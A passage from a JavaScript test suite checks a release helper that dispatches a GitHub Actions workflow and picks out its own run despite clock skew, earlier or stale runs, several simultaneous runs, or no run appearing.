    const run = world.runs[world.runs.length - 1];
    Object.assign(run, { status: 'completed', conclusion: 'success' });
    return run;
  };

  it('finds its run when GitHub\'s clock is well behind the local one', async () => {
    const { world, ctx } = setup();
    world.onWorkflowRun = (w) => { finish(w).createdAt = new Date(ctx.now() - 5 * MINUTE).toISOString(); };

    await expect(dispatchAndWatch(ctx, step, FAST)).resolves.toEqual({ runId: 900 });
  });

  it('does not mistake a dispatch that started moments earlier for its own', async () => {
    const earlier = {
      databaseId: 100, status: 'in_progress', conclusion: '', event: 'workflow_dispatch', headSha: OLD, jobs: [],
      createdAt: new Date(Date.parse('2026-10-02T12:00:00Z') - 5000).toISOString(),
    };
    const { world, ctx } = setup({ runs: [earlier] });
    world.onWorkflowRun = (w) => { finish(w); };

    await expect(dispatchAndWatch(ctx, step, FAST)).resolves.toEqual({ runId: 900 });
  });

  it('ignores an older run that only shows up in the listing after the dispatch', async () => {
    const stale = { databaseId: 50, status: 'in_progress', conclusion: '', event: 'workflow_dispatch', headSha: OLD, jobs: [], createdAt: '2026-10-01T00:00:00Z' };
    const { world, ctx } = setup({ runs: [{ ...stale, databaseId: 80, status: 'completed', conclusion: 'success' }] });
    world.onWorkflowRun = (w) => { finish(w); w.runs.unshift(stale); };

    await expect(dispatchAndWatch(ctx, step, FAST)).resolves.toEqual({ runId: 900 });
  });

  it('says so and follows the first when several runs appear at once', async () => {
    const { world, ctx, logs } = setup();
    const other = { databaseId: 899, status: 'completed', conclusion: 'success', event: 'workflow_dispatch', headSha: TIP, jobs: [], createdAt: '2026-10-02T12:00:00Z' };
    world.onWorkflowRun = (w) => { finish(w); w.runs.push(other); };

    await expect(dispatchAndWatch(ctx, step, FAST)).resolves.toEqual({ runId: 899 });
    expect(logs.join('\n')).toContain('Several release runs appeared at once (899, 900)');
  });

  it('still says so, and does not dispatch twice, when no new run ever appears', async () => {
    const { world, ctx, calls } = setup();
    world.onWorkflowRun = (w) => { w.runs.length = 0; };

    await expect(dispatchAndWatch(ctx, step, FAST)).rejects.toThrow(/did not appear/);
    expect(calls.filter((call) => call[0] === 'gh' && call[1] === 'workflow')).toHaveLength(1);
  });
});

